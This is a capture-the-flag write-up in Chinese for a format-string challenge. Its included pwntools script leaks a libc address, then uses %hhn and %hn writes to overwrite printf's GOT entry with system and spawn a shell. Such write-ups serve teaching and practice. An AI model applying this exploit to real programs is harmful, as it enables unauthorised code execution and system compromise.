# fmt_T

## 题目简述

程序通过递归调用保留多层栈帧，并多次执行可控格式化字符串。先用栈泄露计算 libc 基址，再把 `printf@got` 与 `printf@got+1` 布置为后续位置参数，通过一次 `%hhn` 和一次 `%hn` 部分覆盖 GOT 的低 3 字节，把 `printf` 改为同一 libc 中的 `system`；下一次以 `sh` 为“格式字符串”调用时即变成 `system("sh")`。

## 解题过程

第一阶段用 `%11$p` 泄露 bundled libc 中的返回地址。本题对应偏移为 `0x29D90`：

```python
from pwn import ELF, context, p64, process

context(os="linux", arch="amd64")

io = process("./pwn")
elf = ELF("./pwn", checksec=False)
libc = ELF("./libc.so.6", checksec=False)


def send_stage(payload: bytes) -> None:
    io.sendafter(b"hell.", payload)


send_stage(b"%11$p")
leak = int(io.recvn(14), 16)
libc.address = leak - 0x29D90
system = libc.sym["system"]
```

随后利用递归帧把命令字符串和两个写地址放到稳定参数槽。调试确认它们分别对应第 24、25 个格式化参数：

```python
send_stage(b"sh\x00%")
send_stage(p64(elf.got["printf"]) + p64(elf.got["printf"] + 1)[:7])
```

低 1 字节写到 `printf@got`，接下来的 2 字节从 `printf@got+1` 开始写。第二次填充要按累计输出长度计算：

```python
low_byte = system & 0xFF
next_word = (system >> 8) & 0xFFFF

payload = b""
if low_byte:
    payload += f"%{low_byte}c".encode()
payload += b"%24$hhn"

padding = (next_word - low_byte) & 0xFFFF
if padding:
    payload += f"%{padding}c".encode()
payload += b"%25$hn"

send_stage(payload.ljust(26, b"A"))
io.interactive()
```

只覆盖低 3 字节的前提是 `printf` 与 `system` 位于同一份 libc 映射，高字节本来一致，且目标 GOT 可写。

## 方法总结

- 核心技巧：借助递归帧稳定布置参数，对 GOT 做分段格式化字符串写，将 `printf` 重定向到 `system`。
- 识别信号：存在多轮/递归格式化字符串、GOT 可写且能泄露 libc 时，应考虑把常用输出函数改成命令执行函数。
- 复用要点：`%hhn`/`%hn` 写的是累计字符数的低 8/16 位，第二段宽度必须做模运算；所有参数槽位置都需动态确认。
